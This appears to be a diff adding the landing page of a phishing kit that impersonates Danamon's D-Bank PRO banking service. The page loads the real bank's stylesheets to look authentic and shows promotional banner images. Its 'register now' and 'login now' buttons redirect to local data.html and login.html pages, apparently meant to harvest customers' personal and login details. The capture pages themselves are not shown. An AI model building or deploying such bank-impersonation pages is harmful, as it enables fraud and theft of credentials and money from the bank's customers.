@@ -1,0 +1,125 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Credit Card Danamon</title>
+  <base href="/">
+  <meta name="theme-color" content="#000000">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+  <link rel="stylesheet" href="https://www.dbank.co.id/libs/css/bootstrap/bootstrap.min.css">
+<link rel="stylesheet" href="https://www.dbank.co.id/libs/css/common.css">
+<link rel="stylesheet" href="https://www.dbank.co.id/libs/css/fonts.css">
+<link rel="stylesheet" href="https://www.dbank.co.id/libs/css/bootstrap/bootstrap-select.css">
+<link rel="stylesheet" href="https://www.dbank.co.id/libs/css/bootstrap/bootstrap-datepicker.css">
+<link rel="stylesheet" href="https://www.dbank.co.id/libs/css/bootstrap-material-datetimepicker.css">
+<link rel="stylesheet" href="https://www.dbank.co.id/libs/css/daterangepicker.css">
+<title>D-Bank PRO</title>
+<link href="https://www.dbank.co.id/static/css/main.ed4a32c8.css" rel="stylesheet">
+</head>
+<style>
+body{
+    width: 100%;
+    height: 100%;
+    padding: 0px;
+    position: fixed;
+    left: 0;
+    right: 0;
+    background: #fff;
+    margin: 0px auto;
+}    
+
+button {
+    width: 90%;
+    height: 50px;
+    border-radius: 10px;
+    margin: 5px;
+    background: #FFA401;
+    border: none;
+    color: #fff;
+}
+.loader {
+  width: 12px;
+  height: 12px;
+  border-radius: 50%;
+  display: flex;
+  margin:15px auto;
+  position: absolute;
+  color: #FFF;
+  margin: 0px auto;
+  
+  left: 0;
+  right: 0;
+  top: 50%;
+  z-index: 999999;
+  box-sizing: border-box;
+  animation: animloader 2s linear infinite;
+}
+
+@keyframes animloader {
+  0% {
+    box-shadow: 14px 0 0 -2px,  38px 0 0 -2px,  -14px 0 0 -2px,  -38px 0 0 -2px;
+  }
+  25% {
+    box-shadow: 14px 0 0 -2px,  38px 0 0 -2px,  -14px 0 0 -2px,  -38px 0 0 2px;
+  }
+  50% {
+    box-shadow: 14px 0 0 -2px,  38px 0 0 -2px,  -14px 0 0 2px,  -38px 0 0 -2px;
+  }
+  75% {
+    box-shadow: 14px 0 0 2px,  38px 0 0 -2px,  -14px 0 0 -2px,  -38px 0 0 -2px;
+  }
+  100% {
+    box-shadow: 14px 0 0 -2px,  38px 0 0 2px,  -14px 0 0 -2px,  -38px 0 0 -2px;
+  }
+}
+</style>
+<body>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZNzrrVxV1s84IrGiVKxNS7PZUUTkdaI5RO7zH7BJ5IlESAcOC58kfFvRhFRdnxpikOboVc3dySfIFC0DasL_3ip2fnylJV4Qs7ZFy0CXNwORT3zK8VYOsCbgnolxNj1BnNQ5N4ENicwKKMiGgZ20Hu4gdp2ABJZJSa5qSmM-i7eoX17KWGm1Oyq9mh04/s1080/AddText_06-19-06.39.45.jpg" style="width: 100%; top: 0; margin: 0px auto; position: relative; left: 0; right: 0">
+ <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAMSOWE6xnHmdbVnnr2WE2JXOvgxFJ8clQUyxTuJdVd5bSiJjPcQUESPQUfay5pKb5QUAJXqEQVVxg2YeQ7jhA93KhxCMLTKmBLfMUMGoTuUe7inDSdgUecsSEbew-cLmDUUP6esR6GdE-qAqylX5y56ujsme-oAuveB7Q_jX7dlxOz2vHStEqfPoM1Ag/s1080/AddText_06-19-06.44.38.jpg" style="width: 100%; margin: 0px auto; position: relative;">
+ <center style="margin-top: 20px">
+ <button id="btnku" style="background: #fff; color: #FFA401; border: 2px solid #FFA401">Belum terdaftar di D-Bank Pro <br> <b>Daftar Sekarang</b></button>
+ <button id="btdana">Sudah Punya akun di D-Bank Pro <br><b>Login Sekarang</b></button>
+ </center>
+ <div id="loaderku" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; margin: 0px auto; width: 100%; height: 100%; z-index: 9999999;">
+    <div style="display: flex;
+  margin:15px auto;
+  position: absolute;  left: 0;
+  right: 0;
+  top: 45%;
+  z-index: 999999;
+  box-sizing: border-box;">
+     <span class="loader"></span>
+
+     <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPfykXoSZj0Kp8C9C5S5h0pCR0OtyGsqBo0i2xuswMHaKyIaFVT43xcDKNqA5K_Qthk7g-IPlTbeKInFnx7IaDbeCs6gE-ROEcz7yx8Ga-A6zpoVeLximRvrqxkDpRkwZkXMPsQOWThPH4EKf1w1JUK-N028kX5S6MJ4zl3omRu6GBs0Hf8UmcyTridgo/s351/aaaks.png" width="150px" style="position: absolute; left: 0; right: 0; margin: auto; top: 40%">
+     </div>
+ <div class="sk-fading-container" ></div>
+    <div class="sk-fading-loader" ></div>
+	
+</div>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+  
+ 
+  $( document ).ready(function() {
+       $('#btnku').click(function(e){
+            setTimeout(() => {
+                $('#loaderku').show();
+             window.location.href='data.html';
+            },500)
+            
+       });
+ }); $( document ).ready(function() {
+       $('#btdana').click(function(e){
+            setTimeout(() => {
+                $('#loaderku').show();
+             window.location.href='login.html';
+            },500)
+            
+       });
+ });
+</script>
+ </body>
+</html>
